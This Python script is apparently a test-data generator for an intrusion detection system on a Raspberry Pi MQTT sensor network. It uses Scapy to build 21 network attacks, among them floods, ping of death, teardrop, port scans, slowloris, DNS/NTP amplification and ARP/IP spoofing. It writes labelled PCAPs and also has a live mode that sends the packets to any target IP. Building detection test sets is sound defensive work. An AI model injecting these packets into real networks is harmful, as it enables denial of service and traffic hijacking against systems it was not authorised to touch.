#!/usr/bin/env python3
"""
IWSN Security — RFC-Compliant Attack Simulator v4.0
Micro-network edition: tuned for 2-4 sensor IWSN on Raspberry Pi

Modes:
  OFFLINE:  Generate PCAPs for batch analysis
  LIVE:     Inject attacks into live network traffic in real-time

Usage:
  # Offline — generate all attack PCAPs
  python3 attack_simulator.py --preset all --output ./simulator_output

  # Offline — single attack
  python3 attack_simulator.py --preset syn_flood

  # Live injection — inject a SYN flood onto the network interface
  sudo python3 attack_simulator.py --live --attack syn_flood --iface wlan0

  # Live injection — interactive menu
  sudo python3 attack_simulator.py --live --iface wlan0

  # List all presets
  python3 attack_simulator.py --list
"""

import sys, os, json, time, argparse, random, struct

try:
    from scapy.all import (Ether, ARP, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR, NTP,
                           wrpcap, RandShort, RandIP, fragment, sendp, conf)
except ImportError:
    print("[!] Scapy required. Install: pip3 install scapy")
    sys.exit(1)

# ────────────────────── CONFIGURATION ──────────────────────
# Tuned for 2-4 sensor IWSN micro-network on Raspberry Pi

DIFFICULTY_PROFILES = {
    "easy":    {"rate_mult": 1.5, "noise_pct": 0,   "desc": "Clear attack signatures, no noise"},
    "medium":  {"rate_mult": 1.0, "noise_pct": 15,  "desc": "Standard rates, light noise"},
    "hard":    {"rate_mult": 0.5, "noise_pct": 40,  "desc": "Low-rate with moderate noise"},
}

# IWSN micro-network addressing (matches ESP32 firmware)
GATEWAY_IP     = "10.7.88.1"
BROKER_IP      = "10.7.88.12"      # Current host IP running Mosquitto
SENSOR_IPS     = ["10.7.88.20", "10.7.88.21", "10.7.88.22", "10.7.88.23"]  # ESP32 sensor nodes
ATTACKER_IP    = "10.0.0.50"         # External attacker
DEFAULT_TARGET = BROKER_IP

# MQTT topics matching ESP32 firmware
IWSN_TOPICS = [
    "iwsn/sensors/ultrasonic/distance",
    "iwsn/sensors/ir/obstacle",
    "iwsn/sensors/sonar_2/distance",
    "iwsn/sensors/ir_2/obstacle",
    "iwsn/sensors/status/heartbeat",
    "iwsn/sensors/combined/reading",
]

IWSN_SENSOR_READINGS = {
    "ultrasonic": lambda: {"sensor_id": "SR04M-2", "distance_cm": round(random.uniform(5.0, 300.0), 2), "unit": "cm", "status": "valid"},
    "ir":         lambda: {"sensor_id": "IR_OA_01", "obstacle_detected": random.choice([True, False]), "status": "active"},
    "sonar_2":    lambda: {"sensor_id": "SR04M-2_B", "distance_cm": round(random.uniform(5.0, 300.0), 2), "unit": "cm", "status": "valid"},
    "ir_2":       lambda: {"sensor_id": "IR_OA_02", "obstacle_detected": random.choice([True, False]), "status": "active"},
    "heartbeat":  lambda: {"node_id": "esp32_node", "uptime_seconds": random.randint(60, 86400), "status": "online"},
    "combined":   lambda: {"node_id": "esp32_node", "ultrasonic": {"distance_cm": round(random.uniform(5.0, 300.0), 2)}, "ir_obstacle": {"detected": random.choice([True, False])}},
}

# ────────────────────── MQTT HELPERS ──────────────────────

def build_mqtt_connect(client_id="iwsn_sensor_01"):
    proto_name = b"\x00\x04MQTT"
    proto_level = b"\x04"
    connect_flags = b"\x02"
    keep_alive = b"\x00\x3C"
    var_header = proto_name + proto_level + connect_flags + keep_alive
    cid = client_id.encode()
    payload = struct.pack(">H", len(cid)) + cid
    remaining = var_header + payload
    return bytes([0x10, len(remaining)]) + remaining

def build_mqtt_connack():
    return b"\x20\x02\x00\x00"

def build_mqtt_publish(topic, payload_str, qos=0):
    topic_bytes = topic.encode()
    payload_bytes = payload_str.encode()
    var_header = struct.pack(">H", len(topic_bytes)) + topic_bytes
    if qos > 0:
        var_header += struct.pack(">H", random.randint(1, 65535))
    remaining = var_header + payload_bytes
    flags = 0x30 | ((qos & 0x03) << 1)
    return bytes([flags, len(remaining)]) + remaining

def build_mqtt_subscribe(topic, qos=0):
    topic_bytes = topic.encode()
    pkt_id = struct.pack(">H", random.randint(1, 65535))
    topic_filter = struct.pack(">H", len(topic_bytes)) + topic_bytes + bytes([qos])
    remaining = pkt_id + topic_filter
    return bytes([0x82, len(remaining)]) + remaining

def build_mqtt_suback(pkt_id=1):
    return b"\x90\x03" + struct.pack(">H", pkt_id) + b"\x00"

def build_mqtt_pingreq():
    return b"\xC0\x00"

def build_mqtt_pingresp():
    return b"\xD0\x00"

def build_mqtt_disconnect():
    return b"\xE0\x00"

# ────────────────────── TRAFFIC HELPERS ──────────────────────

def get_sensor_payload(topic):
    for stype, gen_fn in IWSN_SENSOR_READINGS.items():
        if stype in topic:
            return json.dumps(gen_fn())
    return json.dumps({"value": random.randint(0, 100)})

def gen_normal_packets(count=20):
    """Generate normal micro-network traffic (MQTT-heavy, minimal other)."""
    pkts = []
    for _ in range(count):
        src = random.choice(SENSOR_IPS)
        r = random.random()
        if r < 0.70:
            topic = random.choice(IWSN_TOPICS)
            mqtt_data = build_mqtt_publish(topic, get_sensor_payload(topic))
            pkts.append(Ether()/IP(src=src, dst=BROKER_IP)/TCP(sport=RandShort(), dport=1883, flags="PA")/Raw(mqtt_data))
        elif r < 0.85:
            pkts.append(Ether()/IP(src=src, dst=GATEWAY_IP)/UDP(sport=RandShort(), dport=53)/Raw(b"\x00\x01dns"))
        elif r < 0.95:
            pkts.append(Ether()/IP(src=src, dst=GATEWAY_IP)/ICMP())
        else:
            pkts.append(Ether()/IP(src=src, dst=BROKER_IP)/TCP(sport=RandShort(), dport=1883, flags="PA")/Raw(build_mqtt_pingreq()))
    return pkts

def mix_noise(attack_pkts, noise_pct):
    if noise_pct <= 0:
        return attack_pkts
    noise_count = int(len(attack_pkts) * noise_pct / 100)
    noise = gen_normal_packets(noise_count)
    combined = attack_pkts + noise
    random.shuffle(combined)
    return combined

def spread_packet_times(pkts, duration_seconds, jitter=0.0):
    if not pkts:
        return pkts
    start = time.time()
    count = len(pkts)
    step = duration_seconds / max(1, count - 1)
    for i, p in enumerate(pkts):
        delta = random.uniform(-jitter, jitter) if jitter > 0 else 0.0
        p.time = start + (i * step) + delta
    return pkts

def save_attack(pkts, name, output_dir, manifest, noise_pct, attack_type, rfc_ref, pkt_count):
    pkts = mix_noise(pkts, noise_pct)
    filepath = os.path.join(output_dir, f"{name}.pcap")
    wrpcap(filepath, pkts)
    fsz = os.path.getsize(filepath)
    mqtt_count = sum(1 for p in pkts if p.haslayer(TCP) and (p[TCP].dport == 1883 or p[TCP].sport == 1883))
    manifest["attacks"].append({
        "name": name, "file": filepath, "attack_type": attack_type,
        "rfc_reference": rfc_ref, "attack_packets": pkt_count,
        "total_packets": len(pkts), "mqtt_packets": mqtt_count,
        "noise_packets": len(pkts) - pkt_count,
        "file_size_bytes": fsz, "expected_detection": attack_type not in ("None", "MQTT Traffic")
    })
    mqtt_info = f", {mqtt_count} MQTT" if mqtt_count > 0 else ""
    print(f"  + {name}.pcap — {len(pkts)} pkts ({pkt_count} attack + {len(pkts)-pkt_count} noise{mqtt_info}), {fsz/1024:.1f} KB")

# ────────────────────── ATTACK GENERATORS ──────────────────────
# Packet counts scaled for micro-network (small enough to avoid saturation,
# large enough to exceed lowered thresholds)

def gen_syn_flood(n=200, target=DEFAULT_TARGET):
    """RFC 4987: SYN flood — mass SYN without completing handshake."""
    pkts = []
    for i in range(n):
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkts.append(Ether()/IP(src=src, dst=target)/TCP(sport=RandShort(), dport=1883, flags="S", seq=i*1000))
    return spread_packet_times(pkts, duration_seconds=8)

def gen_udp_flood(n=400, target=DEFAULT_TARGET):
    """RFC 768/4732: UDP volumetric flood."""
    pkts = []
    for i in range(n):
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkts.append(Ether()/IP(src=src, dst=target)/UDP(sport=RandShort(), dport=53)/Raw(b"A"*64))
    return spread_packet_times(pkts, duration_seconds=8)

def gen_icmp_flood(n=250, target=DEFAULT_TARGET):
    """RFC 792/4732: ICMP echo request flood."""
    return spread_packet_times(
        [Ether()/IP(src=f"10.0.{i//256}.{i%256}", dst=target)/ICMP(type=8, id=i, seq=i) for i in range(n)],
        duration_seconds=8
    )

def gen_http_flood(n=120, target=DEFAULT_TARGET):
    """RFC 9110: HTTP GET request flood."""
    pkts = []
    for i in range(n):
        src = f"10.0.{(i // 200) + 1}.{(i % 200) + 1}"
        sp = 1024 + (i % 60000)
        pkts.append(Ether()/IP(src=src, dst=target)/TCP(sport=sp, dport=80, flags="PA")/Raw(f"GET / HTTP/1.1\r\nHost: target\r\n\r\n".encode()))
    return spread_packet_times(pkts, duration_seconds=8)

def gen_ping_of_death(n=10, target=DEFAULT_TARGET):
    """RFC 791 S3.2: IP-fragmented ICMP payload that reassembles to >65535 bytes.
    
    Classic Ping of Death (PoD) works by splitting an oversized (~65KB) ICMP echo
    into valid MTU-sized IP fragments. When the victim reassembles the fragments,
    the total exceeds the 65535-byte RFC 791 §3.2 limit, causing a buffer overflow.
    Fragmented form is used here because sending a raw 65KB frame exceeds Ethernet
    MTU (1500 bytes) and is rejected by the kernel sendp() layer.
    """
    pkts = []
    for i in range(n):
        # Build oversized ICMP (65000B payload → ~65028B total when reassembled)
        pkt = IP(src=ATTACKER_IP, dst=target, id=0xDEAD + i) / ICMP() / Raw(b"X" * 65000)
        frags = fragment(pkt, fragsize=1400)   # ~47 fragments per attempt
        pkts.extend([Ether() / f for f in frags])
    return pkts

def gen_land_attack(n=10, target=DEFAULT_TARGET):
    """RFC 6274/CVE-1999-0016: src==dst IP and port."""
    return [Ether()/IP(src=target, dst=target)/TCP(sport=1883, dport=1883, flags="S") for _ in range(n)]

def gen_smurf(n=120, target=DEFAULT_TARGET):
    """BCP 38: ICMP echo to broadcast with spoofed source."""
    bcast = "192.168.1.255"
    return spread_packet_times(
        [Ether()/IP(src=target, dst=bcast)/ICMP(type=8, id=i) for i in range(n)],
        duration_seconds=8
    )

def gen_fraggle(n=120, target=DEFAULT_TARGET):
    """RFC 6274: UDP to broadcast echo/chargen ports."""
    bcast = "192.168.1.255"
    pkts = []
    for i in range(n):
        port = 7 if i % 2 == 0 else 19
        pkts.append(Ether()/IP(src=target, dst=bcast)/UDP(sport=RandShort(), dport=port)/Raw(b"echo"))
    return spread_packet_times(pkts, duration_seconds=8)

def gen_teardrop(n=25, target=DEFAULT_TARGET):
    """RFC 791 S3.2: Overlapping IP fragments."""
    pkts = []
    for _ in range(n):
        p1 = IP(src=ATTACKER_IP, dst=target, proto=17, flags="MF", frag=0)/Raw(b"\x00")
        p2 = IP(src=ATTACKER_IP, dst=target, proto=17, flags="MF", frag=1)/Raw(b"\x00\x00")
        p3 = IP(src=ATTACKER_IP, dst=target, proto=17, frag=1)/Raw(b"\x00")
        pkts.extend([Ether()/p1, Ether()/p2, Ether()/p3])
    return pkts

def gen_syn_scan(n=20, target=DEFAULT_TARGET):
    """RFC 793: SYN scan — SYN to multiple ports, RST on response."""
    pkts = []
    for port in range(1, n+1):
        pkts.append(Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=54321, dport=port, flags="S"))
        pkts.append(Ether()/IP(src=target, dst=ATTACKER_IP)/TCP(sport=port, dport=54321, flags="R"))
    return spread_packet_times(pkts, duration_seconds=15, jitter=0.02)

def gen_connect_scan(n=20, target=DEFAULT_TARGET):
    """RFC 793: Full TCP connect scan — complete handshake then RST."""
    pkts = []
    for port in range(1, n+1):
        pkts.extend([
            Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=54321, dport=port, flags="S"),
            Ether()/IP(src=target, dst=ATTACKER_IP)/TCP(sport=port, dport=54321, flags="SA"),
            Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=54321, dport=port, flags="A"),
            Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=54321, dport=port, flags="R"),
        ])
    return spread_packet_times(pkts, duration_seconds=20, jitter=0.02)

def gen_udp_scan(n=30, target=DEFAULT_TARGET):
    """RFC 768: UDP scan — small probes to many ports."""
    return [Ether()/IP(src=ATTACKER_IP, dst=target)/UDP(sport=54321, dport=p)/Raw(b"pr") for p in range(1, n+1)]

def gen_xmas_scan(n=25, target=DEFAULT_TARGET):
    """RFC 793 S3.9: FIN+PSH+URG flags set."""
    return [Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=54321, dport=p, flags="FPU") for p in range(1, n+1)]

def gen_null_scan(n=25, target=DEFAULT_TARGET):
    """RFC 793 S3.9: No TCP flags set."""
    return [Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=54321, dport=p, flags=0) for p in range(1, n+1)]

def gen_fin_scan(n=25, target=DEFAULT_TARGET):
    """RFC 793 S3.9: Only FIN flag set."""
    return [Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=54321, dport=p, flags="F") for p in range(1, n+1)]

def gen_rudy(n=20, target=DEFAULT_TARGET):
    """RFC 9110: Slow POST — send body at <10 bytes/sec."""
    pkts = []
    sp = 12345
    pkts.append(Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=sp, dport=80, flags="S"))
    pkts.append(Ether()/IP(src=target, dst=ATTACKER_IP)/TCP(sport=80, dport=sp, flags="SA"))
    pkts.append(Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=sp, dport=80, flags="A"))
    post = "POST /form HTTP/1.1\r\nHost: target\r\nContent-Length: 300\r\n\r\n"
    pkts.append(Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=sp, dport=80, flags="PA")/Raw(post.encode()))
    for _ in range(n):
        pkts.append(Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=sp, dport=80, flags="PA")/Raw(b"A"))
    return spread_packet_times(pkts, duration_seconds=180, jitter=0.1)

def gen_slowloris(n=10, target=DEFAULT_TARGET):
    """RFC 9110: Slow HTTP headers — keep sending partial headers."""
    pkts = []
    start = time.time()
    for conn in range(n):
        sp = 20000 + conn
        timeline = [0, 2, 25, 50, 75, 100]
        payloads = [
            ("S", b""),
            ("PA", b"GET / HTTP/1.1\r\n"),
            ("PA", b"Host: target\r\n"),
            ("PA", b"User-Agent: slow\r\n"),
            ("PA", b"X-a: 1\r\n"),
            ("PA", b"X-b: 1\r\n"),
        ]
        for idx, (flags, payload) in enumerate(payloads):
            pkt = Ether()/IP(src=ATTACKER_IP, dst=target)/TCP(sport=sp, dport=80, flags=flags)
            if payload:
                pkt = pkt/Raw(payload)
            pkt.time = start + timeline[idx] + (conn * 0.01)
            pkts.append(pkt)
    return pkts

def gen_dns_amplification(n=120, target=DEFAULT_TARGET):
    """RFC 5358: Large DNS responses from port 53."""
    pkts = []
    for i in range(n):
        src = f"8.8.{random.randint(0,255)}.{random.randint(1,254)}"
        pkts.append(Ether()/IP(src=src, dst=target)/UDP(sport=53, dport=RandShort())/Raw(b"D"*600))
    return spread_packet_times(pkts, duration_seconds=8)

def gen_ntp_amplification(n=120, target=DEFAULT_TARGET):
    """CVE-2013-5211: Large NTP monlist responses from port 123."""
    pkts = []
    for i in range(n):
        src = f"132.163.{random.randint(0,255)}.{random.randint(1,254)}"
        pkts.append(Ether()/IP(src=src, dst=target)/UDP(sport=123, dport=RandShort())/Raw(b"N"*500))
    return spread_packet_times(pkts, duration_seconds=8)

def gen_arp_spoofing(n=20, target=DEFAULT_TARGET):
    """RFC 826/5227: Gratuitous ARP replies poisoning the ARP cache.

    Each packet claims a different MAC address owns the same IP (gateway 10.7.88.1).
    Real ARP spoofing sends op=2 (ARP Reply) with a forged hwsrc to redirect traffic.
    """
    pkts = []
    gateway_ip = "10.7.88.1"   # Claim to be the local gateway
    for i in range(n):
        mac = f"aa:bb:cc:dd:ee:{i:02x}"
        # Gratuitous ARP Reply: "gateway_ip is at <spoofed mac>"
        pkts.append(
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            ARP(op=2,                          # ARP Reply
                hwsrc=mac,                     # Spoofed sender MAC
                psrc=gateway_ip,               # Gateway IP being claimed
                hwdst="ff:ff:ff:ff:ff:ff",     # Broadcast
                pdst=target)                   # Victim IP
        )
    return pkts

def gen_ip_spoofing(n=30, target=DEFAULT_TARGET):
    """BCP 38: Packets with impossible source addresses."""
    pkts = []
    bad_srcs = ["0.0.0.0", "255.255.255.255", "224.0.0.1", "127.0.0.1"]
    for i in range(n):
        src = bad_srcs[i % len(bad_srcs)]
        pkts.append(Ether()/IP(src=src, dst=target)/TCP(sport=RandShort(), dport=1883, flags="S"))
    return pkts

# ────────────────── MQTT TRAFFIC GENERATOR ──────────────────

def gen_mqtt_traffic(n_sessions=4, msgs_per_session=10):
    """Generate realistic IWSN MQTT traffic matching ESP32 firmware output."""
    pkts = []
    base_port = 40000
    for sess in range(min(n_sessions, len(SENSOR_IPS))):
        sensor_ip = SENSOR_IPS[sess]
        client_id = f"esp32_iwsn_node_{sess+1:02d}"
        sport = base_port + sess

        pkts.append(Ether()/IP(src=sensor_ip, dst=BROKER_IP)/TCP(sport=sport, dport=1883, flags="PA")/Raw(build_mqtt_connect(client_id)))
        pkts.append(Ether()/IP(src=BROKER_IP, dst=sensor_ip)/TCP(sport=1883, dport=sport, flags="PA")/Raw(build_mqtt_connack()))

        sub_data = build_mqtt_subscribe(f"iwsn/cmd/node{sess+1}")
        pkts.append(Ether()/IP(src=sensor_ip, dst=BROKER_IP)/TCP(sport=sport, dport=1883, flags="PA")/Raw(sub_data))
        pkts.append(Ether()/IP(src=BROKER_IP, dst=sensor_ip)/TCP(sport=1883, dport=sport, flags="PA")/Raw(build_mqtt_suback()))

        for m in range(msgs_per_session):
            topic = random.choice(IWSN_TOPICS)
            pub_data = build_mqtt_publish(topic, get_sensor_payload(topic))
            pkts.append(Ether()/IP(src=sensor_ip, dst=BROKER_IP)/TCP(sport=sport, dport=1883, flags="PA")/Raw(pub_data))
            if m % 5 == 0:
                pkts.append(Ether()/IP(src=sensor_ip, dst=BROKER_IP)/TCP(sport=sport, dport=1883, flags="PA")/Raw(build_mqtt_pingreq()))
                pkts.append(Ether()/IP(src=BROKER_IP, dst=sensor_ip)/TCP(sport=1883, dport=sport, flags="PA")/Raw(build_mqtt_pingresp()))

        pkts.append(Ether()/IP(src=sensor_ip, dst=BROKER_IP)/TCP(sport=sport, dport=1883, flags="PA")/Raw(build_mqtt_disconnect()))
    return pkts

def gen_normal_only(n=100):
    """Clean IWSN traffic for false positive testing."""
    return gen_normal_packets(n)

# ────────────────────── ATTACK REGISTRY ──────────────────────

ATTACK_REGISTRY = {
    "syn_flood":         {"gen": gen_syn_flood,         "rfc": "RFC 4987, RFC 793",       "type": "SYN Flood"},
    "udp_flood":         {"gen": gen_udp_flood,         "rfc": "RFC 768, RFC 4732",       "type": "UDP Flood"},
    "icmp_flood":        {"gen": gen_icmp_flood,        "rfc": "RFC 792, RFC 4732",       "type": "ICMP Flood"},
    "http_flood":        {"gen": gen_http_flood,        "rfc": "RFC 9110, RFC 4732",      "type": "HTTP Flood"},
    "ping_of_death":     {"gen": gen_ping_of_death,     "rfc": "RFC 791 S3.2, RFC 6274",  "type": "Ping of Death"},
    "land_attack":       {"gen": gen_land_attack,       "rfc": "RFC 6274, CVE-1999-0016", "type": "Land Attack"},
    "smurf_attack":      {"gen": gen_smurf,             "rfc": "RFC 2827 (BCP 38)",       "type": "Smurf Attack"},
    "fraggle_attack":    {"gen": gen_fraggle,           "rfc": "RFC 768, RFC 6274",       "type": "Fraggle Attack"},
    "teardrop_attack":   {"gen": gen_teardrop,          "rfc": "RFC 791 S3.2, RFC 6274",  "type": "Teardrop Attack"},
    "tcp_syn_scan":      {"gen": gen_syn_scan,          "rfc": "RFC 793 S3.9",            "type": "TCP SYN Scan"},
    "tcp_connect_scan":  {"gen": gen_connect_scan,      "rfc": "RFC 793",                 "type": "TCP Connect Scan"},
    "udp_scan":          {"gen": gen_udp_scan,          "rfc": "RFC 768",                 "type": "UDP Scan"},
    "xmas_scan":         {"gen": gen_xmas_scan,         "rfc": "RFC 793 S3.9",            "type": "Xmas Tree Scan"},
    "null_scan":         {"gen": gen_null_scan,         "rfc": "RFC 793 S3.9",            "type": "NULL Scan"},
    "fin_scan":          {"gen": gen_fin_scan,          "rfc": "RFC 793 S3.9",            "type": "FIN Scan"},
    "rudy_attack":       {"gen": gen_rudy,              "rfc": "RFC 9110, OWASP",         "type": "RUDY (Slow POST)"},
    "slowloris":         {"gen": gen_slowloris,         "rfc": "RFC 9110, OWASP",         "type": "Slowloris"},
    "dns_amplification": {"gen": gen_dns_amplification, "rfc": "RFC 5358, RFC 5625",      "type": "DNS Amplification"},
    "ntp_amplification": {"gen": gen_ntp_amplification, "rfc": "RFC 5905, CVE-2013-5211", "type": "NTP Amplification"},
    "arp_spoofing":      {"gen": gen_arp_spoofing,      "rfc": "RFC 826, RFC 5227",       "type": "ARP Spoofing"},
    "ip_spoofing":       {"gen": gen_ip_spoofing,       "rfc": "RFC 2827 (BCP 38)",       "type": "IP Spoofing"},
    "mqtt_traffic":      {"gen": gen_mqtt_traffic,      "rfc": "MQTT v3.1.1 (OASIS)",     "type": "MQTT Traffic"},
}

# ────────────────────── LIVE INJECTION MODE ──────────────────────

def live_injection_menu(iface):
    """Interactive menu for injecting attacks into live network."""
    print(f"\n  Live injection interface: {iface}")
    print(f"  Target network: 10.7.88.0/22")
    print(f"  Ctrl+C to stop injection / return to menu\n")

    attacks = [(k, v) for k, v in ATTACK_REGISTRY.items() if v["type"] != "MQTT Traffic"]
    while True:
        print("  ┌─────────────────────────────────────────────┐")
        print("  │         LIVE ATTACK INJECTION MENU           │")
        print("  └─────────────────────────────────────────────┘")
        for i, (name, info) in enumerate(attacks, 1):
            print(f"  {i:2d}. {info['type']:25s} [{info['rfc']}]")
        print(f"  {len(attacks)+1:2d}. Generate MQTT sensor traffic")
        print(f"   0. Exit")
        print()

        try:
            choice = input("  Select attack [0]: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  Exiting.")
            break

        if not choice or choice == "0":
            break

        try:
            idx = int(choice) - 1
        except ValueError:
            print("  Invalid choice.")
            continue

        if idx == len(attacks):
            print("\n  Generating MQTT sensor traffic...")
            pkts = gen_mqtt_traffic()
            print(f"  Sending {len(pkts)} MQTT packets on {iface}...")
            sendp(pkts, iface=iface, verbose=False)
            print("  Done.\n")
            continue

        if idx < 0 or idx >= len(attacks):
            print("  Invalid choice.")
            continue

        name, info = attacks[idx]
        print(f"\n  Injecting: {info['type']} ({info['rfc']})")
        pkts = info["gen"]()
        print(f"  Sending {len(pkts)} packets on {iface}...")

        try:
            sendp(pkts, iface=iface, inter=0.01, verbose=False)
            print(f"  Injected {len(pkts)} packets.\n")
        except KeyboardInterrupt:
            print(f"\n  Stopped. Sent partial.\n")
        except PermissionError:
            print("  [!] Permission denied. Run with sudo for live injection.")
            break


def live_inject_single(iface, attack_name, target=None):
    """Inject a single attack type into the live network."""
    if attack_name not in ATTACK_REGISTRY:
        print(f"  [!] Unknown attack: {attack_name}")
        return

    info = ATTACK_REGISTRY[attack_name]
    if target:
        pkts = info["gen"](target=target)
    else:
        pkts = info["gen"]()

    print(f"\n  Injecting: {info['type']} ({info['rfc']})")
    print(f"  Interface: {iface}")
    print(f"  Packets:   {len(pkts)}")
    print(f"  Sending...")

    try:
        sendp(pkts, iface=iface, inter=0.005, verbose=False)
        print(f"  Done. {len(pkts)} packets injected.\n")
    except KeyboardInterrupt:
        print(f"\n  Stopped.\n")
    except PermissionError:
        print("  [!] Permission denied. Run with sudo for live injection.")

# ────────────────────── MAIN ──────────────────────

def main():
    parser = argparse.ArgumentParser(description="IWSN Attack Simulator v4.0 — Micro-Network Edition")
    parser.add_argument("--preset", default="all", help="Attack name, 'mqtt_traffic', or 'all'")
    parser.add_argument("--difficulty", default="easy", choices=DIFFICULTY_PROFILES.keys())
    parser.add_argument("--output", default="./simulator_output", help="Output directory for PCAPs")
    parser.add_argument("--seed", type=int, default=None, help="Random seed for reproducible output")
    parser.add_argument("--list", action="store_true", help="List all available attack presets")
    parser.add_argument("--live", action="store_true", help="Enable live injection mode (requires sudo)")
    parser.add_argument("--iface", default="wlan0", help="Network interface for live injection")
    parser.add_argument("--attack", default=None, help="Attack to inject in live mode (or interactive menu)")
    parser.add_argument("--target", default=None, help="Override target IP for live injection")
    args = parser.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    if args.list:
        print("\n  Available Attack Presets (21 attacks + MQTT + Normal)")
        print("  " + "=" * 55)
        for name, info in ATTACK_REGISTRY.items():
            print(f"  {name:25s} — {info['type']:25s} [{info['rfc']}]")
        print(f"  {'normal_traffic':25s} — {'Clean IWSN Traffic':25s} [N/A]")
        return

    if args.live:
        print("\n  IWSN Security — Live Attack Injector v4.0")
        print("  " + "=" * 45)
        if args.attack:
            live_inject_single(args.iface, args.attack, args.target)
        else:
            live_injection_menu(args.iface)
        return

    # OFFLINE PCAP GENERATION
    diff = DIFFICULTY_PROFILES[args.difficulty]
    output_dir = args.output
    os.makedirs(output_dir, exist_ok=True)

    print("\n  IWSN Security — Attack Simulator v4.0 (Micro-Network)")
    print("  " + "=" * 55)
    print(f"  Difficulty:  {args.difficulty.upper()} — {diff['desc']}")
    print(f"  Output:      {output_dir}")
    print(f"  Noise:       {diff['noise_pct']}% normal traffic injection")
    print(f"  Network:     {len(SENSOR_IPS)} sensor nodes + broker at {BROKER_IP}\n")

    manifest = {
        "generator": "IWSN Attack Simulator v4.0",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "difficulty": args.difficulty,
        "noise_percentage": diff["noise_pct"],
        "network": {"sensor_ips": SENSOR_IPS, "broker_ip": BROKER_IP, "gateway_ip": GATEWAY_IP},
        "attacks": []
    }

    attacks_to_run = ATTACK_REGISTRY.keys() if args.preset == "all" else [args.preset]

    print("  Generating PCAPs")
    print("  " + "-" * 55)

    for name in attacks_to_run:
        if name not in ATTACK_REGISTRY:
            print(f"  ! Unknown preset: {name}")
            continue
        info = ATTACK_REGISTRY[name]
        pkts = info["gen"]()
        attack_count = len(pkts)
        save_attack(pkts, name, output_dir, manifest, diff["noise_pct"], info["type"], info["rfc"], attack_count)

    print("\n  --- Normal IWSN Traffic (False Positive Test) ---")
    normal_pkts = gen_normal_only(100)
    filepath = os.path.join(output_dir, "normal_traffic.pcap")
    wrpcap(filepath, normal_pkts)
    mqtt_count = sum(1 for p in normal_pkts if p.haslayer(TCP) and (p[TCP].dport == 1883 or p[TCP].sport == 1883))
    manifest["attacks"].append({
        "name": "normal_traffic", "file": filepath, "attack_type": "None",
        "rfc_reference": "N/A", "attack_packets": 0, "total_packets": len(normal_pkts),
        "mqtt_packets": mqtt_count, "noise_packets": len(normal_pkts),
        "file_size_bytes": os.path.getsize(filepath), "expected_detection": False
    })
    print(f"  + normal_traffic.pcap — {len(normal_pkts)} pkts (clean, {mqtt_count} MQTT)")

    manifest_path = os.path.join(output_dir, "manifest.json")
    with open(manifest_path, "w") as f:
        json.dump(manifest, f, indent=2)

    total_mqtt = sum(e.get("mqtt_packets", 0) for e in manifest["attacks"])
    print(f"\n  Done: {len(manifest['attacks'])} PCAPs + manifest.json")
    print(f"  Total MQTT packets: {total_mqtt}")
    print(f"  Manifest: {manifest_path}\n")

if __name__ == "__main__":
    main()
